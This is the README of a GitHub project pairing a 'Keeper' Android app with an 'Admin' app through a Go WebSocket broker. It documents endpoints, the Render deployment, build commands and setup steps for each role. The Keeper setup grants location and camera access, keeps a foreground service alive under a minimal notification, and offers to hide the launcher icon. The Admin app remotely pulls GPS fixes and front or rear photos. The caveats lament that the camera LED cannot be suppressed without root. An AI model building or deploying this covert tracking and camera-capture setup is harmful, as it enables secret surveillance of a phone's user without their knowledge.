<div align="center">

# vivo WireLink

**Two-flavor Android app + Go WebSocket broker.**
**One APK per role, driven by GitHub releases.**

[![Release Build](https://img.shields.io/github/actions/workflow/status/Ximanta99Error/vivo-wirelink/release.yml?style=for-the-badge&logo=githubactions&logoColor=white&label=release%20build)](../../actions/workflows/release.yml)
[![Latest Release](https://img.shields.io/github/v/release/Ximanta99Error/vivo-wirelink?style=for-the-badge&logo=github&logoColor=white)](../../releases)
[![License](https://img.shields.io/github/license/Ximanta99Error/vivo-wirelink?style=for-the-badge&color=yellow)](LICENSE)

[![Android](https://img.shields.io/badge/Platform-Android-3DDC84?style=for-the-badge&logo=android&logoColor=white)](https://www.android.com/)
[![Kotlin](https://img.shields.io/badge/Kotlin-2.0.21-7F52FF?style=for-the-badge&logo=kotlin&logoColor=white)](https://kotlinlang.org/)
[![Go](https://img.shields.io/badge/Go-1.22-00ADD8?style=for-the-badge&logo=go&logoColor=white)](https://go.dev/)
[![Gradle](https://img.shields.io/badge/Gradle-8.11.1-02303A?style=for-the-badge&logo=gradle&logoColor=white)](https://gradle.org/)

[![Min SDK](https://img.shields.io/badge/Min%20SDK-24-3DDC84?style=for-the-badge&logo=android&logoColor=white)](#)
[![Keeper Target](https://img.shields.io/badge/Keeper%20target-Android%2016%20(36)-3DDC84?style=for-the-badge&logo=android&logoColor=white)](#)
[![Admin Target](https://img.shields.io/badge/Admin%20target-Android%2014%20(34)-3DDC84?style=for-the-badge&logo=android&logoColor=white)](#)

[![Docker](https://img.shields.io/badge/Docker-multi--stage-2496ED?style=for-the-badge&logo=docker&logoColor=white)](https://www.docker.com/)
[![Render](https://img.shields.io/badge/Render-free%20tier-46E3B7?style=for-the-badge&logo=render&logoColor=white)](https://render.com/)
[![WebSocket](https://img.shields.io/badge/Transport-WebSocket-010101?style=for-the-badge&logo=socketdotio&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API)

</div>

---

## 📖 Overview

**vivo WireLink** is a two-role Android app paired with a small Go backend that brokers live commands between them over WebSocket.

- 🕶️ **Keeper** — installs on a phone, opens a persistent WebSocket, answers `location` and `camera` commands on demand.
- 🎛️ **Admin** — installs on another phone, signs in with a shared password, fires those commands, sees results in real time.
- 🖥️ **Backend** — Go broker running on Render free tier, kept awake by an external HEAD cron.

One repo. Two flavors. Two APKs per release, named by the release tag.

---

## 🏗️ Architecture

```
┌─────────────┐         ┌──────────────┐         ┌─────────────┐
│   Keeper    │◄───WS──►│   Backend    │◄───WS──►│    Admin    │
│  (Android)  │         │     (Go)     │         │  (Android)  │
└─────────────┘         └──────────────┘         └─────────────┘
       │                        │                        │
       │  location / camera     │   command relay        │
       │  result frames         │   keepers list         │
       ▼                        ▼                        ▼
   GPS + CameraX           in-memory maps           results + preview
                           /ping  ← cron
```

- 📡 **Transport** — WebSocket, one socket per peer
- 🔑 **Auth** — `POST /api/login` with shared password → SHA-256 token → `wss://.../ws/admin?token=...`
- 🗂️ **State** — in-memory, no database, restart clears it, clients auto-reconnect
- ⏰ **Keep-alive** — `HEAD /ping` every 10 min, plus 30s WS pings from the keeper

---

## 📁 Repository Layout

```
vivo-wirelink/
├── .github/workflows/release.yml     release-only APK build
├── app/                              Android module (2 flavors)
│   ├── build.gradle
│   ├── proguard-rules.pro
│   └── src/main/
│       ├── AndroidManifest.xml
│       ├── java/com/vivo/wirelink/
│       │   ├── MainActivity.kt       launcher shim, flavor router
│       │   ├── Prefs.kt              SharedPreferences wrapper
│       │   ├── WsClient.kt           WS + auto-reconnect
│       │   ├── KeeperActivity.kt     keeper control panel
│       │   ├── KeeperService.kt      foreground service (camera|location)
│       │   └── AdminActivity.kt      admin console
│       └── res/                      layouts, values, drawables, mipmaps
├── backend/                          Go broker
│   ├── main.go
│   ├── go.mod
│   ├── Dockerfile
│   └── render.yaml
├── build.gradle
├── gradle.properties
└── settings.gradle
```

---

## 📦 Releases & Artifacts

Cut a release on GitHub → the workflow fires → both APKs attach automatically.

| Tag example | Keeper artifact                    | Admin artifact                    |
| ----------- | ---------------------------------- | --------------------------------- |
| `v1.0.0`    | `vivo-wirelink-keeper-v1.0.0.apk`  | `vivo-wirelink-admin-v1.0.0.apk`  |
| `v1.2.3`    | `vivo-wirelink-keeper-v1.2.3.apk`  | `vivo-wirelink-admin-v1.2.3.apk`  |

> ⚠️ The workflow triggers **only** on `release: [published]`. Committing code, pushing files, or editing the workflow does **not** start a build.

---

## 🖥️ Backend — Go on Render

### Endpoints

| Method | Path          | Purpose                                     |
| ------ | ------------- | ------------------------------------------- |
| `HEAD` | `/ping`       | Keep-alive target for external cron         |
| `POST` | `/api/login`  | `{password}` → `{token}`                    |
| `GET`  | `/ws/keeper`  | Keeper socket, `?deviceId=<id>`             |
| `GET`  | `/ws/admin`   | Admin socket, `?token=<sha256>`             |

### Deploy

1. Render → **New** → **Blueprint** → connect repo.
2. Confirm `backend/render.yaml`.
3. Set `ADMIN_PASSWORD` in the Render UI.
4. Wait for the first build (~2–4 min on free tier).
5. Note the URL — `https://<service>.onrender.com`.

### Keep-alive

Point any cron at `HEAD https://<service>.onrender.com/ping` every **10 minutes**.
Alternatively, leave the keeper app running — its WebSocket pings every 30 s and keeps Render warm by itself.

---

## 🕶️ Keeper Flavor

| Property        | Value                     |
| --------------- | ------------------------- |
| applicationId   | `com.vivo.wirelink`       |
| targetSdk       | **36** (Android 16)       |
| Foreground type | `camera|location`         |
| Notification    | MIN-importance, ongoing   |

**Setup**

1. Install the keeper APK.
2. Enter backend URL, save.
3. Tap **keeper mode**.
4. Grant **location**, **camera**, **notifications**.
5. Tap **disable battery optimization**.
6. Tap **start service**.
7. Optionally tap **hide launcher icon**.

**Recovery path** if the icon is hidden — Settings → Apps → *vivo WireLink* → **Open** → tap *restore launcher icon*.

---

## 🎛️ Admin Flavor

| Property        | Value                     |
| --------------- | ------------------------- |
| applicationId   | `com.vivo.wirelink.admin` |
| targetSdk       | **34** (Android 14)       |
| Drawer          | Sign in / Sign out        |

**Setup**

1. Install the admin APK.
2. Enter backend URL, save.
3. Open the hamburger drawer → **sign in** → type the backend password.
4. Use the three buttons — **get location**, **front camera**, **rear camera**.

---

## 🔧 Build Locally

```bash
# keeper only
gradle assembleKeeperRelease

# admin only
gradle assembleAdminRelease

# both
gradle assembleKeeperRelease assembleAdminRelease
```

APKs land at:
```
app/build/outputs/apk/keeper/release/app-keeper-release.apk
app/build/outputs/apk/admin/release/app-admin-release.apk
```

---

## ⚠️ Known Caveats

- 🔐 **Debug-signed APKs** — install fine sideloaded; not publishable to Play without a real keystore.
- 🧊 **Render cold start** — after 15 min idle, first request takes 30–60 s. Keeper WS prevents this while running.
- 📸 **Camera LED** — Android forces it on for every capture. Not suppressible without root.
- 🕶️ **Hidden icon recovery** — Clearing app data does **not** restore it; uninstall or Settings → Apps → Open.
- 🔄 **Reinstall = new deviceId** — the admin's old target reference dies.
- 👥 **Single-keeper target** — backend tracks all; admin UI fires at the first online one.
- 📡 **Base64 photo latency** — 2–4 MB rear shot over 4G → 5–15 s round-trip. Expected.
- 🌐 **HTTPS only** — the app rewrites `http` → `ws`, so point it at `https://` and it becomes `wss://`.
